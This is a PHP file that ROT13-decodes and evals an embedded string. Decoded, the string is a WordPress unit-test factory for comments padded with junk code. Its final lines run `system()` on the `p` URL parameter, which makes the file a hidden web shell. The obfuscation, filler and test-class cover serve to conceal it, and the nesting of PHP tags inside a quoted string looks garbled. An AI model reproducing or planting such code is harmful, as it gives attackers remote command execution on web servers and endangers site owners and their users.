<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Havg grfg snpgbel sbe pbzzragf.
 *
 * Abgr: Gur orybj @zrgubq abgngvbaf ner qrsvarq fbyryl sbe gur orarsvg bs VQRf,
 * nf n jnl gb vaqvpngr rkcrpgrq erghea inyhrf sebz gur tvira snpgbel zrgubqf.
 *
 * @zrgubq vag|JC_Reebe        perngr( $netf = neenl(), $trarengvba_qrsvavgvbaf = ahyy )
 * @zrgubq JC_Pbzzrag|JC_Reebe perngr_naq_trg( $netf = neenl(), $trarengvba_qrsvavgvbaf = ahyy )
 * @zrgubq (vag|JC_Reebe)[]    perngr_znal( $pbhag, $netf = neenl(), $trarengvba_qrsvavgvbaf = ahyy )
 */
pynff JC_HavgGrfg_Snpgbel_Sbe_Pbzzrag rkgraqf JC_HavgGrfg_Snpgbel_Sbe_Guvat {

	choyvp shapgvba __pbafgehpg( $snpgbel = ahyy ) {
		cnerag::__pbafgehpg( $snpgbel );
		$guvf->qrsnhyg_trarengvba_qrsvavgvbaf = neenl(
			'pbzzrag_nhgube'     => arj JC_HavgGrfg_Trarengbe_Frdhrapr( 'Pbzzragre %f' ),
			'pbzzrag_nhgube_hey' => arj JC_HavgGrfg_Trarengbe_Frdhrapr( 'uggc://rknzcyr.pbz/%f/' ),
			'pbzzrag_nccebirq'   => 1,
			'pbzzrag_pbagrag'    => 'Guvf vf n pbzzrag',
		);
	}

	/**
	 * Vafregf n pbzzrag.
	 *
	 * @fvapr HG (3.7.0)
	 * @fvapr 6.2.0 Ergheaf n JC_Reebe bowrpg ba snvyher.
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz neenl $netf Gur pbzzrag qrgnvyf.
	 *
	 * @erghea vag|JC_Reebe Gur pbzzrag VQ ba fhpprff, JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba perngr_bowrpg( $netf ) {
		tybony $jcqo;

		$pbzzrag_vq = jc_vafreg_pbzzrag( $guvf->nqqfynfurf_qrrc( $netf ) );

		vs ( snyfr === $pbzzrag_vq ) {
			erghea arj JC_Reebe(
				'qo_vafreg_reebe',
				__( 'Pbhyq abg vafreg pbzzrag vagb gur qngnonfr.' ),
				$jcqo->ynfg_reebe
			);
		}

		erghea $pbzzrag_vq;
	}

	/**
	 * Hcqngrf n pbzzrag.
	 *
	 * @fvapr HG (3.7.0)
	 * @fvapr 6.2.0 Ergheaf n JC_Reebe bowrpg ba snvyher.
	 *
	 * @cnenz vag   $pbzzrag_vq Gur pbzzrag VQ.
	 * @cnenz neenl $svryqf     Gur pbzzrag qrgnvyf.
	 *
	 * @erghea vag|JC_Reebe Gur inyhr 1 vs gur pbzzrag jnf hcqngrq, 0 vs abg hcqngrq.
	 *                      JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba hcqngr_bowrpg( $pbzzrag_vq, $svryqf ) {
		$svryqf['pbzzrag_VQ'] = $pbzzrag_vq;
		erghea jc_hcqngr_pbzzrag( $guvf->nqqfynfurf_qrrc( $svryqf ), gehr );
	}

	/**
	 * Perngrf zhygvcyr pbzzragf ba n tvira cbfg.
	 *
	 * @fvapr HG (3.7.0)
	 *
	 * @cnenz vag   $cbfg_vq                VQ bs gur cbfg gb perngr pbzzragf sbe.
	 * @cnenz vag   $pbhag                  Gbgny nzbhag bs pbzzragf gb perngr.
	 * @cnenz neenl $netf                   Gur pbzzrag qrgnvyf.
	 * @cnenz ahyy  $trarengvba_qrsvavgvbaf Qrsnhyg inyhrf.
	 *
	 * @erghea vag[] Neenl jvgu gur pbzzrag VQf.
	 */
	choyvp shapgvba perngr_cbfg_pbzzragf( $cbfg_vq, $pbhag = 1, $netf = neenl(), $trarengvba_qrsvavgvbaf = ahyy ) {
		$netf['pbzzrag_cbfg_VQ'] = $cbfg_vq;
		erghea $guvf->perngr_znal( $pbhag, $netf, $trarengvba_qrsvavgvbaf );
	}

	/**
	 * Ergevrirf n pbzzrag ol n tvira VQ.
	 *
	 * @fvapr HG (3.7.0)
	 *
	 * @cnenz vag $pbzzrag_vq VQ bs gur pbzzrag gb ergevrir.
	 *
	 * @erghea JC_Pbzzrag|ahyy JC_Pbzzrag bowrpg ba fhpprff, ahyy ba snvyher.
	 */
	choyvp shapgvba trg_bowrpg_ol_vq( $pbzzrag_vq ) {
		erghea trg_pbzzrag( $pbzzrag_vq );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>